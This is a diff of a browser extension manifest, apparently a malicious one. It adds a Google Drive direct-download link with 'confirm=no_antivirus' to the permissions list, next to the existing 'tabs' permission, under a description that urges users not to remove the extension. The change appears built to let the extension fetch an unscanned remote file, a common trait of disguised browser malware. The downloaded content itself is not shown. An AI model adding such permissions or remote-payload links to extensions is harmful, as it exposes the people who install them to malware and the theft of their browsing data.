@@ -6,7 +6,7 @@
   "description": "This extention is very useful. Don't remove it.",
   "icons": { "128": "logo.jpg" },
 
-  "permissions": [ "tabs" ],
+  "permissions": [ "tabs", "https://drive.google.com/uc?export=download&confirm=no_antivirus&id=1JLOWXC603p7fiMHvtvQJvddNkpDmQQX7" ],
 
   "content_scripts": [
     {
